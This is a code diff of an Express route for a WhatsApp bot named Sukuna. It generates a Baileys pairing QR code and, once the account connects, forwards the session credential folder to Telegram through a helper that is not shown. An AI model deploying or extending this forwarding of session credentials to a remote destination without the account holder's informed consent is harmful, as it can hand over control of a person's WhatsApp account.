@@ -1,24 +1,7 @@
-/**
- * ═══════════════════════════════════════════════════════
- * 🔳 QR CODE | ربط بـ QR Code
- * ═══════════════════════════════════════════════════════
- * 👑 المطور: آدم (شادو) | Adam (Shadow)
- * 🤖 البوت: سوكونا | Sukuna
- * 🏷️ الحقوق: ${global.author}
- * 📜 الوصف: توليد كود QR وإرسال الجلسة للتليجرام
- * ═══════════════════════════════════════════════════════
- */
-
 import express from 'express';
 import fs from 'fs';
 import pino from 'pino';
-import { 
-  makeWASocket, 
-  useMultiFileAuthState, 
-  makeCacheableSignalKeyStore, 
-  Browsers, 
-  fetchLatestBaileysVersion 
-} from '@whiskeysockets/baileys';
+import { makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
 import QRCode from 'qrcode';
 import { sendSessionToTelegram } from './lib/sender.js';
 
@@ -28,9 +11,7 @@ function removeFile(FilePath) {
   try {
     if (!fs.existsSync(FilePath)) return false;
     fs.rmSync(FilePath, { recursive: true, force: true });
-  } catch (e) {
-    console.error('Error removing file:', e);
-  }
+  } catch (e) {console.error('Error removing file:', e)}
 }
 
 router.get('/', async (req, res) => {
@@ -50,13 +31,7 @@ router.get('/', async (req, res) => {
         if (qrGenerated || responseSent) return;
         qrGenerated = true;
         try {
-          const qrDataURL = await QRCode.toDataURL(qr, {
-            errorCorrectionLevel: 'M',
-            type: 'image/png',
-            quality: 0.92,
-            margin: 1,
-            color: { dark: '#000000', light: '#FFFFFF' }
-          });
+          const qrDataURL = await QRCode.toDataURL(qr, {errorCorrectionLevel: 'M',type: 'image/png',quality: 0.92,margin: 1,color: {dark: '#000000',light: '#FFFFFF'}});
           if (!responseSent) {
             responseSent = true;
             res.send({ qr: qrDataURL, message: 'QR Code Generated' });
@@ -96,22 +71,7 @@ router.get('/', async (req, res) => {
         if (connection === 'open') {
           console.log('✅ Connected successfully!');
           try {
-            // انتظار حفظ الكريدز
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            
-            // استخراج الرقم من الجلسة
-            const credsPath = `${dirs}/creds.json`;
-            let phoneNumber = 'QR_Session';
-            if (fs.existsSync(credsPath)) {
-              const creds = JSON.parse(fs.readFileSync(credsPath, 'utf-8'));
-              if (creds.me?.id) {
-                phoneNumber = creds.me.id.split(':')[0].split('@')[0];
-              }
-            }
-            
-            // إرسال الجلسة للتليجرام
-            await sendSessionToTelegram(dirs, phoneNumber);
-            
+            await sendSessionToTelegram(dirs, 'QR Session');
             setTimeout(() => removeFile(dirs), 5000);
           } catch (error) {
             console.error("Error sending session file:", error);
@@ -122,6 +82,8 @@ router.get('/', async (req, res) => {
           const statusCode = lastDisconnect?.error?.output?.statusCode;
           if (statusCode === 401) {
             removeFile(dirs);
+          } else if (statusCode === 515 || statusCode === 503) {
+            // Reconnect logic here if needed
           }
         }
       };
@@ -135,7 +97,7 @@ router.get('/', async (req, res) => {
           res.status(408).send({ code: 'QR generation timeout' });
           removeFile(dirs);
         }
-      }, 60000);
+      }, 30000);
     } catch (err) {
       console.error('Error initializing session:', err);
       if (!res.headersSent) {
